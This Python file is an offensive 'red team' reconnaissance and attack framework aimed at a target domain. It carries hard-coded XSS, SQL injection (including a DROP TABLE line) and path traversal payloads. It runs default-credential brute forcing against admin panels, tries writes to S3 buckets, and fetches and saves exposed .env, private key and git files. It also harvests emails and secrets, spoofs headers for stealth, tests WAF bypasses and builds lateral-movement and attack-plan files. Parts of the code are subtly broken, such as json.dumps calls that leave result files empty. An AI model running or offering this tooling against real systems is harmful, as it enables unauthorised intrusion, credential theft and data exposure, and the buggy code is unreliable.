#!/usr/bin/env python3
"""
Red Team Reconnaissance Framework v2.0 - Offensive Security Tool
Author: Umair Majeed
Description: Advanced red teaming and offensive reconnaissance automation
Warning: For authorized security testing only!
"""

import os
import sys
import json
import time
import socket
import random
import hashlib
import subprocess
import argparse
import threading
import ipaddress
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional, Set, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin

# Try to import optional modules
try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False


class RedTeamRecon:
    """Advanced offensive reconnaissance and red teaming framework"""
    
    def __init__(self, target: str, output_dir: str = None, stealth: bool = False):
        self.target = target.lower().strip()
        self.start_time = datetime.now()
        self.stealth_mode = stealth
        self.session = self.create_stealth_session() if stealth else requests.Session()
        
        # Colors for output
        self.colors = {
            'red': '\033[91m',
            'green': '\033[92m',
            'yellow': '\033[93m',
            'blue': '\033[94m',
            'purple': '\033[95m',
            'cyan': '\033[96m',
            'white': '\033[97m',
            'black': '\033[90m',
            'bold': '\033[1m',
            'reset': '\033[0m'
        }
        
        # Setup directories
        if output_dir:
            self.base_dir = Path(output_dir)
        else:
            self.base_dir = Path(f"redteam_{self.target}_{self.start_time.strftime('%Y%m%d_%H%M%S')}")
        
        self.setup_directories()
        
        # Results storage
        self.subdomains = set()
        self.alive_hosts = set()
        self.open_ports = {}
        self.technologies = {}
        self.vulnerabilities = []
        self.screenshots = []
        self.emails = set()
        self.api_endpoints = set()
        self.secret_keys = set()
        self.backup_files = set()
        self.admin_panels = set()
        self.cloud_assets = set()
        self.git_repos = set()
        self.s3_buckets = set()
        
        # Red team specific data
        self.cves = []
        self.default_creds = []
        self.misconfigurations = []
        self.sensitive_dirs = []
        self.waf_info = {}
        self.cdn_info = {}
        
        # Tool paths
        self.tools = {
            'subfinder': 'subfinder',
            'assetfinder': 'assetfinder',
            'amass': 'amass',
            'httpx': 'httpx',
            'nuclei': 'nuclei',
            'naabu': 'naabu',
            'ffuf': 'ffuf',
            'gau': 'gau',
            'katana': 'katana',
            'waybackurls': 'waybackurls',
            'dalfox': 'dalfox',
            'nmap': 'nmap',
            'whatweb': 'whatweb',
            'wappalyzer': 'wappalyzer'
        }
        
        # Payloads for offensive testing
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        self.sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL--",
            "' WAITFOR DELAY '00:00:05'--"
        ]
        
        self.path_traversal = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        self.sensitive_files = [
            ".env", ".git/config", "wp-config.php", "config.php",
            "database.yml", "credentials.txt", "backup.sql",
            "id_rsa", ".ssh/id_rsa", "web.config", "robots.txt",
            "sitemap.xml", "crossdomain.xml", "clientaccesspolicy.xml"
        ]
    
    def create_stealth_session(self):
        """Create a stealthy requests session with random headers"""
        session = requests.Session()
        
        # Random User-Agent rotation
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Add random delays in stealth mode
        if self.stealth_mode:
            session.headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        return session
    
    def setup_directories(self):
        """Create directory structure for red team operations"""
        directories = [
            self.base_dir,
            self.base_dir / "recon",
            self.base_dir / "recon/subdomains",
            self.base_dir / "recon/alive_hosts",
            self.base_dir / "recon/ports",
            self.base_dir / "attack",
            self.base_dir / "attack/xss",
            self.base_dir / "attack/sqli",
            self.base_dir / "attack/lfi",
            self.base_dir / "attack/idor",
            self.base_dir / "exploitation",
            self.base_dir / "exploitation/credentials",
            self.base_dir / "exploitation/backdoors",
            self.base_dir / "exploitation/lateral_movement",
            self.base_dir / "intel",
            self.base_dir / "intel/emails",
            self.base_dir / "intel/secrets",
            self.base_dir / "intel/git_repos",
            self.base_dir / "screenshots",
            self.base_dir / "reports",
            self.base_dir / "logs"
        ]
        
        for dir_path in directories:
            dir_path.mkdir(parents=True, exist_ok=True)
        
        self.print_colored(f"[+] Output directory: {self.base_dir}", "green")
    
    def print_colored(self, message: str, color: str = "white"):
        """Print colored messages"""
        print(f"{self.colors.get(color, '')}{message}{self.colors['reset']}")
    
    def display_banner(self):
        """Display offensive red team banner"""
        banner = f"""
{self.colors['red']}{self.colors['bold']}╔══════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║   ██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗     ║
║   ██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║     ║
║   ██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║     ║
║   ██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║     ║
║   ██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║     ║
║   ╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     ║
║                                                                          ║
║         RED TEAM RECONNAISSANCE FRAMEWORK v2.0                          ║
║         Offensive Security & Attack Surface Mapping                     ║
║                                                                          ║
║         [{self.colors['yellow']}*{self.colors['red']}] Target: {self.target}                                          ║
║         [{self.colors['yellow']}*{self.colors['red']}] Mode: {'STEALTH' if self.stealth_mode else 'AGGRESSIVE'}                                 ║
║         [{self.colors['yellow']}*{self.colors['red']}] Time: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}                              ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════╝{self.colors['reset']}
"""
        print(banner)
        
        menu = f"""
{self.colors['yellow']}{self.colors['bold']}═════════════════════ OFFENSIVE RECON MENU ══════════════════════{self.colors['reset']}

{self.colors['red']}[1]{self.colors['reset']} {self.colors['cyan']}Full Attack Surface Mapping{self.colors['reset']}
{self.colors['red']}[2]{self.colors['reset']} {self.colors['cyan']}Subdomain Takeover Check{self.colors['reset']}
{self.colors['red']}[3]{self.colors['reset']} {self.colors['cyan']}Cloud Asset Discovery (AWS/Azure/GCP){self.colors['reset']}
{self.colors['red']}[4]{self.colors['reset']} {self.colors['cyan']}Git Repository Leak Detection{self.colors['reset']}
{self.colors['red']}[5]{self.colors['reset']} {self.colors['cyan']}S3 Bucket Enumeration{self.colors['reset']}
{self.colors['red']}[6]{self.colors['reset']} {self.colors['cyan']}API Endpoint Discovery & Testing{self.colors['reset']}
{self.colors['red']}[7]{self.colors['reset']} {self.colors['cyan']}XSS Vulnerability Scan{self.colors['reset']}
{self.colors['red']}[8]{self.colors['reset']} {self.colors['cyan']}SQL Injection Testing{self.colors['reset']}
{self.colors['red']}[9]{self.colors['reset']} {self.colors['cyan']}Default Credential Check{self.colors['reset']}
{self.colors['red']}[10]{self.colors['reset']} {self.colors['cyan']}CVE Exploit Scanner{self.colors['reset']}
{self.colors['red']}[11]{self.colors['reset']} {self.colors['cyan']}Sensitive File Discovery{self.colors['reset']}
{self.colors['red']}[12]{self.colors['reset']} {self.colors['cyan']}Email Harvesting & OSINT{self.colors['reset']}
{self.colors['red']}[13]{self.colors['reset']} {self.colors['cyan']}Password & Secret Key Discovery{self.colors['reset']}
{self.colors['red']}[14]{self.colors['reset']} {self.colors['cyan']}WAF/CDN Detection & Bypass{self.colors['reset']}
{self.colors['red']}[15]{self.colors['reset']} {self.colors['cyan']}Full Red Team Assessment{self.colors['reset']}
{self.colors['red']}[99]{self.colors['reset']} {self.colors['cyan']}Exit{self.colors['reset']}

{self.colors['yellow']}{self.colors['bold']}═══════════════════════════════════════════════════════════════{self.colors['reset']}
"""
        print(menu)
    
    # ================================================================
    # OFFENSIVE RECONNAISSANCE MODULES
    # ================================================================
    
    def subdomain_takeover_check(self):
        """Check for potential subdomain takeovers"""
        self.print_colored("[*] Checking for subdomain takeovers...", "yellow")
        
        takeover_indicators = {
            'github': ['There isn\'t a GitHub Pages site here', '404 Not Found'],
            'heroku': ['No such app', 'Heroku | No such app'],
            'aws_s3': ['NoSuchBucket', 'The specified bucket does not exist'],
            'azure': ['404 Web Site not found', 'Azure Websites'],
            'wordpress': ['Do you want to register', 'Creating a new site']
        }
        
        takeover_results = []
        
        for subdomain in list(self.subdomains)[:100]:  # Limit for performance
            try:
                response = self.session.get(f"http://{subdomain}", timeout=5, verify=False)
                response_text = response.text.lower()
                
                for service, indicators in takeover_indicators.items():
                    for indicator in indicators:
                        if indicator.lower() in response_text:
                            takeover_results.append({
                                'subdomain': subdomain,
                                'service': service,
                                'vulnerable': True
                            })
                            self.print_colored(f"[!] POTENTIAL TAKEOVER: {subdomain} -> {service}", "red")
                            break
                            
            except:
                pass
            
            if self.stealth_mode:
                time.sleep(random.uniform(0.5, 1.5))
        
        # Save results
        takeover_file = self.base_dir / "intel" / "subdomain_takeovers.json"
        with open(takeover_file, 'w') as f:
            json.dumps(takeover_results, indent=2)
        
        return takeover_results
    
    def cloud_asset_discovery(self):
        """Discover cloud assets (AWS, Azure, GCP)"""
        self.print_colored("[*] Discovering cloud assets...", "yellow")
        
        cloud_patterns = {
            'aws': [
                '.s3.amazonaws.com', '.s3-', '.elb.amazonaws.com',
                '.cloudfront.net', '.execute-api.', '.rds.amazonaws.com'
            ],
            'azure': [
                '.azurewebsites.net', '.blob.core.windows.net',
                '.azure-api.net', '.cloudapp.azure.com', '.azurefd.net'
            ],
            'gcp': [
                '.appspot.com', '.cloudfunctions.net', '.run.app',
                '.storage.googleapis.com'
            ]
        }
        
        for subdomain in self.subdomains:
            for cloud, patterns in cloud_patterns.items():
                for pattern in patterns:
                    if pattern in subdomain:
                        self.cloud_assets.add(subdomain)
                        self.print_colored(f"[+] Cloud asset found: {subdomain} [{cloud}]", "green")
        
        # Save results
        cloud_file = self.base_dir / "intel" / "cloud_assets.txt"
        with open(cloud_file, 'w') as f:
            for asset in self.cloud_assets:
                f.write(f"{asset}\n")
        
        return self.cloud_assets
    
    def git_repo_leak_detection(self):
        """Detect exposed git repositories"""
        self.print_colored("[*] Checking for exposed git repositories...", "yellow")
        
        git_paths = [
            '/.git/config', '/.git/HEAD', '/.git/index',
            '/.git/logs/HEAD', '/.git/refs/heads/master'
        ]
        
        for host in self.alive_hosts:
            for git_path in git_paths:
                try:
                    url = urljoin(host, git_path)
                    response = self.session.get(url, timeout=5, verify=False)
                    
                    if response.status_code == 200:
                        self.git_repos.add(url)
                        self.print_colored(f"[!] EXPOSED GIT REPO: {url}", "red")
                        
                        # Save git content
                        git_file = self.base_dir / "intel" / "git_leaks" / f"{host.replace('://', '_').replace('/', '_')}.txt"
                        git_file.parent.mkdir(exist_ok=True)
                        with open(git_file, 'w') as f:
                            f.write(response.text)
                            
                except:
                    pass
                
                if self.stealth_mode:
                    time.sleep(0.5)
        
        return self.git_repos
    
    def s3_bucket_enumeration(self):
        """Enumerate and test S3 buckets"""
        self.print_colored("[*] Enumerating S3 buckets...", "yellow")
        
        bucket_patterns = [
            self.target.replace('.', '-'),
            self.target.replace('.', '_'),
            f"{self.target}-backup",
            f"{self.target}-production",
            f"{self.target}-staging",
            f"assets.{self.target}",
            f"static.{self.target}"
        ]
        
        for pattern in bucket_patterns:
            bucket_url = f"https://{pattern}.s3.amazonaws.com"
            try:
                response = self.session.get(bucket_url, timeout=5, verify=False)
                
                if response.status_code == 200:
                    self.s3_buckets.add(bucket_url)
                    self.print_colored(f"[+] Accessible S3 bucket: {bucket_url}", "green")
                    
                    # Check if bucket is writable
                    test_file = f"security_test_{random.randint(1,9999)}.txt"
                    test_url = f"{bucket_url}/{test_file}"
                    
                    # Attempt to upload test file
                    try:
                        upload_response = self.session.put(test_url, data="Security Test", timeout=5)
                        if upload_response.status_code in [200, 204]:
                            self.print_colored(f"[!] WRITABLE S3 BUCKET: {bucket_url}", "red")
                            self.misconfigurations.append(f"Writable S3 bucket: {bucket_url}")
                    except:
                        pass
                        
            except:
                pass
            
            if self.stealth_mode:
                time.sleep(random.uniform(1, 2))
        
        return self.s3_buckets
    
    def api_endpoint_discovery(self):
        """Discover and test API endpoints"""
        self.print_colored("[*] Discovering API endpoints...", "yellow")
        
        api_patterns = [
            '/api/', '/v1/api/', '/v2/api/', '/rest/', '/graphql',
            '/swagger/', '/swagger.json', '/openapi.json', '/docs',
            '/v1/', '/v2/', '/api/v1/', '/api/v2/', '/service/',
            '/webservice/', '/soap/', '/xmlrpc.php', '/wp-json/'
        ]
        
        for host in self.alive_hosts:
            for pattern in api_patterns:
                try:
                    url = urljoin(host, pattern)
                    response = self.session.get(url, timeout=5, verify=False)
                    
                    if response.status_code in [200, 201, 401, 403]:
                        self.api_endpoints.add(url)
                        
                        # Check for GraphQL introspection
                        if '/graphql' in url:
                            introspection_query = '{"query":"{__schema{types{name}}}"}'
                            graphql_response = self.session.post(url, data=introspection_query, timeout=5)
                            if 'types' in graphql_response.text:
                                self.print_colored(f"[!] GraphQL introspection enabled: {url}", "red")
                                self.misconfigurations.append(f"GraphQL introspection: {url}")
                        
                except:
                    pass
                
                if self.stealth_mode:
                    time.sleep(0.3)
        
        # Save results
        api_file = self.base_dir / "attack" / "api_endpoints.txt"
        with open(api_file, 'w') as f:
            for endpoint in self.api_endpoints:
                f.write(f"{endpoint}\n")
        
        return self.api_endpoints
    
    def xss_vulnerability_scan(self):
        """Scan for XSS vulnerabilities"""
        self.print_colored("[*] Scanning for XSS vulnerabilities...", "yellow")
        
        xss_findings = []
        
        for host in list(self.alive_hosts)[:50]:  # Limit for performance
            for payload in self.xss_payloads:
                for param in ['q', 'search', 's', 'id', 'page', 'name', 'user']:
                    try:
                        test_url = f"{host}?{param}={payload}"
                        response = self.session.get(test_url, timeout=5, verify=False)
                        
                        if payload in response.text and '<script>' in response.text:
                            xss_findings.append({
                                'url': test_url,
                                'payload': payload,
                                'parameter': param
                            })
                            self.print_colored(f"[!] XSS VULNERABILITY: {test_url}", "red")
                            self.vulnerabilities.append(f"XSS: {test_url}")
                            
                    except:
                        pass
                    
                    if self.stealth_mode:
                        time.sleep(0.5)
        
        # Save results
        xss_file = self.base_dir / "attack" / "xss" / "xss_findings.json"
        with open(xss_file, 'w') as f:
            json.dumps(xss_findings, indent=2)
        
        return xss_findings
    
    def sql_injection_test(self):
        """Test for SQL injection vulnerabilities"""
        self.print_colored("[*] Testing for SQL injection...", "yellow")
        
        sqli_findings = []
        
        for host in list(self.alive_hosts)[:50]:
            for payload in self.sql_payloads:
                for param in ['id', 'page', 'user', 'product', 'category']:
                    try:
                        test_url = f"{host}?{param}={payload}"
                        response = self.session.get(test_url, timeout=5, verify=False)
                        
                        # Check for SQL error messages
                        sql_errors = ['sql syntax', 'mysql_fetch', 'ora-', 'postgresql error', 
                                     'unclosed quotation mark', 'microsoft ole db', 'sqlite']
                        
                        for error in sql_errors:
                            if error.lower() in response.text.lower():
                                sqli_findings.append({
                                    'url': test_url,
                                    'payload': payload,
                                    'parameter': param,
                                    'evidence': error
                                })
                                self.print_colored(f"[!] SQL INJECTION: {test_url}", "red")
                                self.vulnerabilities.append(f"SQLi: {test_url}")
                                break
                                
                    except:
                        pass
                    
                    if self.stealth_mode:
                        time.sleep(0.5)
        
        # Save results
        sqli_file = self.base_dir / "attack" / "sqli" / "sqli_findings.json"
        with open(sqli_file, 'w') as f:
            json.dumps(sqli_findings, indent=2)
        
        return sqli_findings
    
    def default_credential_check(self):
        """Test for default credentials"""
        self.print_colored("[*] Checking for default credentials...", "yellow")
        
        default_creds = [
            ('admin', 'admin'), ('admin', 'password'), ('root', 'root'),
            ('admin', '123456'), ('administrator', 'administrator'),
            ('user', 'user'), ('test', 'test'), ('guest', 'guest'),
            ('admin', 'toor'), ('root', 'toor'), ('cisco', 'cisco')
        ]
        
        common_paths = [
            '/admin', '/login', '/wp-admin', '/administrator',
            '/cpanel', '/webmail', '/plesk', '/phpmyadmin'
        ]
        
        cred_findings = []
        
        for host in self.alive_hosts:
            for path in common_paths:
                login_url = urljoin(host, path)
                
                for username, password in default_creds:
                    try:
                        response = self.session.post(login_url, 
                                                    data={'username': username, 'password': password},
                                                    timeout=5, verify=False)
                        
                        if response.status_code == 200 and ('dashboard' in response.text.lower() or 
                                                           'welcome' in response.text.lower()):
                            cred_findings.append({
                                'url': login_url,
                                'username': username,
                                'password': password
                            })
                            self.print_colored(f"[!] DEFAULT CREDENTIALS: {username}:{password} @ {login_url}", "red")
                            self.default_creds.append(f"{login_url} - {username}:{password}")
                            
                    except:
                        pass
                    
                    if self.stealth_mode:
                        time.sleep(1)
        
        # Save results
        cred_file = self.base_dir / "exploitation" / "credentials" / "default_creds.json"
        with open(cred_file, 'w') as f:
            json.dumps(cred_findings, indent=2)
        
        return cred_findings
    
    def cve_exploit_scanner(self):
        """Scan for known CVEs"""
        self.print_colored("[*] Scanning for known CVEs...", "yellow")
        
        # Common vulnerable software patterns
        cve_patterns = {
            'CVE-2017-5638': ['struts2', 'struts', 'action:', 'org.apache.struts'],
            'CVE-2014-0160': ['openssl', 'heartbleed', 'ssltest'],
            'CVE-2021-44228': ['log4j', 'jndi', '${jndi'],
            'CVE-2019-19781': ['citrix', '/vpn/', '/citrix/'],
            'CVE-2017-0144': ['eternalblue', 'smb', 'windows'],
            'CVE-2020-1472': ['zerologon', 'netlogon', 'domain controller']
        }
        
        for host in self.alive_hosts:
            for cve, patterns in cve_patterns.items():
                for pattern in patterns:
                    if pattern in host.lower():
                        self.cves.append({'host': host, 'cve': cve})
                        self.print_colored(f"[!] POTENTIAL CVE: {cve} on {host}", "red")
        
        # Check headers for server information
        for host in self.alive_hosts:
            try:
                response = self.session.get(host, timeout=5, verify=False)
                server = response.headers.get('Server', '')
                x_powered = response.headers.get('X-Powered-By', '')
                
                if 'Apache/2.2' in server:
                    self.cves.append({'host': host, 'cve': 'CVE-2011-3192 (Apache DoS)'})
                elif 'nginx/1.0' in server:
                    self.cves.append({'host': host, 'cve': 'CVE-2013-2028 (nginx stack overflow)'})
                    
            except:
                pass
        
        # Save results
        cve_file = self.base_dir / "exploitation" / "cve_results.json"
        with open(cve_file, 'w') as f:
            json.dumps(self.cves, indent=2)
        
        return self.cves
    
    def sensitive_file_discovery(self):
        """Discover sensitive files"""
        self.print_colored("[*] Searching for sensitive files...", "yellow")
        
        for host in self.alive_hosts:
            for sensitive_file in self.sensitive_files:
                try:
                    url = urljoin(host, sensitive_file)
                    response = self.session.get(url, timeout=5, verify=False)
                    
                    if response.status_code == 200:
                        self.sensitive_dirs.append(url)
                        self.print_colored(f"[!] SENSITIVE FILE: {url}", "red")
                        
                        # Save the file content
                        safe_name = sensitive_file.replace('/', '_')
                        file_path = self.base_dir / "intel" / "secrets" / f"{safe_name}_{host.replace('://', '_')}.txt"
                        with open(file_path, 'w') as f:
                            f.write(response.text)
                            
                except:
                    pass
                
                if self.stealth_mode:
                    time.sleep(0.3)
        
        return self.sensitive_dirs
    
    def email_harvesting(self):
        """Harvest emails from various sources"""
        self.print_colored("[*] Harvesting email addresses...", "yellow")
        
        # Common email patterns
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        
        # Check website source
        for host in self.alive_hosts:
            try:
                response = self.session.get(host, timeout=5, verify=False)
                import re
                emails = re.findall(email_pattern, response.text)
                
                for email in emails:
                    if self.target in email:
                        self.emails.add(email)
                        self.print_colored(f"[+] Email found: {email}", "green")
                        
            except:
                pass
        
        # Try to fetch from known endpoints
        email_endpoints = [
            '/contact', '/about', '/team', '/staff', '/employees',
            '/authors', '/contributors', '/wp-json/wp/v2/users'
        ]
        
        for host in self.alive_hosts:
            for endpoint in email_endpoints:
                try:
                    url = urljoin(host, endpoint)
                    response = self.session.get(url, timeout=5, verify=False)
                    import re
                    emails = re.findall(email_pattern, response.text)
                    
                    for email in emails:
                        if self.target in email:
                            self.emails.add(email)
                            
                except:
                    pass
        
        # Save emails
        email_file = self.base_dir / "intel" / "emails" / "harvested_emails.txt"
        with open(email_file, 'w') as f:
            for email in sorted(self.emails):
                f.write(f"{email}\n")
        
        return self.emails
    
    def secret_key_discovery(self):
        """Discover secret keys and passwords"""
        self.print_colored("[*] Searching for secret keys...", "yellow")
        
        secret_patterns = [
            r'[aA][pP][iI][kK][eE][yY]\s*[:=]\s*["\']?[\w-]+',
            r'[sS][eE][cC][rR][eE][tT]\s*[:=]\s*["\']?[\w-]+',
            r'[pP][aA][sS][sS][wW][oO][rR][dD]\s*[:=]\s*["\']?[\w-]+',
            r'[tT][oO][kK][eE][nN]\s*[:=]\s*["\']?[\w-]+',
            r'AKIA[0-9A-Z]{16}',  # AWS Key
            r'-----BEGIN RSA PRIVATE KEY-----',
            r'-----BEGIN DSA PRIVATE KEY-----'
        ]
        
        import re
        
        for host in self.alive_hosts:
            try:
                response = self.session.get(host, timeout=5, verify=False)
                
                for pattern in secret_patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    
                    for match in matches:
                        self.secret_keys.add(match)
                        self.print_colored(f"[!] POTENTIAL SECRET: {match[:50]}... on {host}", "red")
                        
            except:
                pass
        
        # Save secrets
        secret_file = self.base_dir / "intel" / "secrets" / "discovered_secrets.txt"
        with open(secret_file, 'w') as f:
            for secret in self.secret_keys:
                f.write(f"{secret}\n")
        
        return self.secret_keys
    
    def waf_detection_bypass(self):
        """Detect WAF and attempt bypass techniques"""
        self.print_colored("[*] Detecting WAF and testing bypasses...", "yellow")
        
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare', '__cfduid'],
            'AWS WAF': ['x-amzn-RequestId', 'aws-waf'],
            'Imperva': ['_incap_ses', 'visid_incap'],
            'F5 BIG-IP': ['X-WA-Info', 'F5', 'BIGipServer'],
            'Sucuri': ['sucuri', 'X-Sucuri-ID'],
            'ModSecurity': ['Mod_Security', 'NOYB']
        }
        
        bypass_payloads = [
            '<script>alert(1)</script>',
            "' OR '1'='1",
            '../../../etc/passwd',
            'union select null--'
        ]
        
        for host in self.alive_hosts[:10]:  # Limit for performance
            try:
                response = self.session.get(host, timeout=5, verify=False)
                
                # Detect WAF
                detected_waf = []
                for waf, signatures in waf_signatures.items():
                    for sig in signatures:
                        if sig in response.headers or sig in response.text.lower():
                            detected_waf.append(waf)
                
                if detected_waf:
                    self.waf_info[host] = detected_waf
                    self.print_colored(f"[!] WAF DETECTED on {host}: {', '.join(detected_waf)}", "yellow")
                    
                    # Test bypasses
                    for bypass in bypass_payloads:
                        test_url = f"{host}?test={bypass}"
                        bypass_response = self.session.get(test_url, timeout=5, verify=False)
                        
                        if bypass in bypass_response.text and bypass_response.status_code == 200:
                            self.print_colored(f"[!] WAF BYPASS POSSIBLE: {bypass} on {host}", "red")
                            self.vulnerabilities.append(f"WAF bypass on {host}")
                            
                else:
                    self.print_colored(f"[+] No WAF detected on {host}", "green")
                    
            except:
                pass
        
        return self.waf_info
    
    def lateral_movement_prep(self):
        """Prepare lateral movement data"""
        self.print_colored("[*] Preparing lateral movement intelligence...", "yellow")
        
        lateral_data = {
            'target': self.target,
            'internal_ips': [],
            'services': [],
            'credentials': list(self.default_creds),
            'vulnerabilities': self.vulnerabilities,
            'cloud_assets': list(self.cloud_assets),
            'api_endpoints': list(self.api_endpoints)
        }
        
        # Extract IP addresses
        for subdomain in self.subdomains:
            try:
                ip = socket.gethostbyname(subdomain)
                lateral_data['internal_ips'].append(ip)
            except:
                pass
        
        # Save lateral movement data
        lateral_file = self.base_dir / "exploitation" / "lateral_movement" / "intel.json"
        with open(lateral_file, 'w') as f:
            json.dumps(lateral_data, indent=2)
        
        self.print_colored(f"[+] Lateral movement intelligence saved", "green")
        
        # Generate attack plan
        self.generate_attack_plan()
        
        return lateral_data
    
    def generate_attack_plan(self):
        """Generate offensive attack plan based on findings"""
        self.print_colored("[*] Generating attack plan...", "yellow")
        
        attack_plan = {
            'immediate_targets': [],
            'exploitation_vectors': [],
            'recommended_tools': [],
            'attack_sequence': []
        }
        
        # Prioritize findings
        if self.s3_buckets:
            attack_plan['immediate_targets'].extend(list(self.s3_buckets)[:3])
            attack_plan['exploitation_vectors'].append('S3 bucket enumeration and takeover')
            attack_plan['recommended_tools'].append('awscli, bucket_finder')
        
        if self.default_creds:
            attack_plan['immediate_targets'].append('Admin panels with default creds')
            attack_plan['exploitation_vectors'].append('Default credential abuse')
            attack_plan['attack_sequence'].append('1. Login using found default credentials')
        
        if self.git_repos:
            attack_plan['exploitation_vectors'].append('Exposed git repository analysis')
            attack_plan['recommended_tools'].append('truffleHog, git-dumper')
        
        if self.secret_keys:
            attack_plan['exploitation_vectors'].append('Secret key abuse')
            attack_plan['attack_sequence'].append('2. Test discovered API keys and tokens')
        
        if self.vulnerabilities:
            attack_plan['exploitation_vectors'].extend(self.vulnerabilities[:5])
            attack_plan['attack_sequence'].append('3. Exploit discovered vulnerabilities')
        
        # Save attack plan
        plan_file = self.base_dir / "exploitation" / "attack_plan.json"
        with open(plan_file, 'w') as f:
            json.dumps(attack_plan, indent=2)
        
        # Display summary
        self.print_colored("\n" + "="*60, "cyan")
        self.print_colored("ATTACK PLAN SUMMARY", "bold")
        self.print_colored("="*60, "cyan")
        
        if attack_plan['immediate_targets']:
            self.print_colored("\n[+] Immediate Targets:", "yellow")
            for target in attack_plan['immediate_targets'][:5]:
                self.print_colored(f"    - {target}", "white")
        
        if attack_plan['exploitation_vectors']:
            self.print_colored("\n[+] Exploitation Vectors:", "yellow")
            for vector in attack_plan['exploitation_vectors'][:5]:
                self.print_colored(f"    - {vector}", "white")
        
        if attack_plan['attack_sequence']:
            self.print_colored("\n[+] Recommended Attack Sequence:", "yellow")
            for step in attack_plan['attack_sequence']:
                self.print_colored(f"    {step}", "white")
        
        return attack_plan
    
    # ================================================================
    # MAIN EXECUTION - RED TEAM MODE
    # ================================================================
    
    def run_full_red_team_assessment(self):
        """Execute complete red team assessment"""
        self.print_colored("\n[*] Starting FULL RED TEAM ASSESSMENT...", "red")
        self.print_colored("[!] This will perform aggressive testing!", "yellow")
        
        confirmation = input("Continue? (y/n): ").strip().lower()
        if confirmation != 'y':
            self.print_colored("[*] Aborted.", "yellow")
            return
        
        # Phase 1: Reconnaissance
        self.print_colored("\n[+] Phase 1: Reconnaissance", "cyan")
        self.enumerate_subdomains()
        self.discover_alive_hosts()
        
        # Phase 2: Attack Surface Discovery
        self.print_colored("\n[+] Phase 2: Attack Surface Mapping", "cyan")
        self.port_scan()
        self.api_endpoint_discovery()
        self.cloud_asset_discovery()
        
        # Phase 3: Vulnerability Discovery
        self.print_colored("\n[+] Phase 3: Vulnerability Assessment", "cyan")
        self.subdomain_takeover_check()
        self.git_repo_leak_detection()
        self.s3_bucket_enumeration()
        self.sensitive_file_discovery()
        self.default_credential_check()
        self.cve_exploit_scanner()
        
        # Phase 4: Active Exploitation Testing
        self.print_colored("\n[+] Phase 4: Active Exploitation Testing", "cyan")
        self.xss_vulnerability_scan()
        self.sql_injection_test()
        self.waf_detection_bypass()
        
        # Phase 5: OSINT and Intel Gathering
        self.print_colored("\n[+] Phase 5: OSINT & Intelligence", "cyan")
        self.email_harvesting()
        self.secret_key_discovery()
        
        # Phase 6: Lateral Movement Prep
        self.print_colored("\n[+] Phase 6: Lateral Movement Preparation", "cyan")
        self.lateral_movement_prep()
        
        # Phase 7: Report Generation
        self.print_colored("\n[+] Phase 7: Generating Red Team Report", "cyan")
        self.generate_redteam_report()
        
        self.print_colored("\n[+] RED TEAM ASSESSMENT COMPLETE!", "green")
    
    def generate_redteam_report(self):
        """Generate comprehensive red team report"""
        self.print_colored("[*] Generating Red Team report...", "yellow")
        
        report_file = self.base_dir / "reports" / "redteam_report.html"
        elapsed = (datetime.now() - self.start_time).total_seconds()
        
        html_content = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Red Team Report - {self.target}</title>
    <style>
        body {{
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            margin: 20px;
            line-height: 1.6;
        }}
        h1, h2, h3 {{ color: #ff0000; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{
            background: #1a1a1a;
            padding: 20px;
            border-left: 5px solid #ff0000;
            margin-bottom: 20px;
        }}
        .critical {{ color: #ff0000; font-weight: bold; }}
        .high {{ color: #ff6600; }}
        .medium {{ color: #ffff00; }}
        .low {{ color: #00ff00; }}
        .info {{ color: #00ffff; }}
        table {{
            width: 100%;
            border-collapse: collapse;
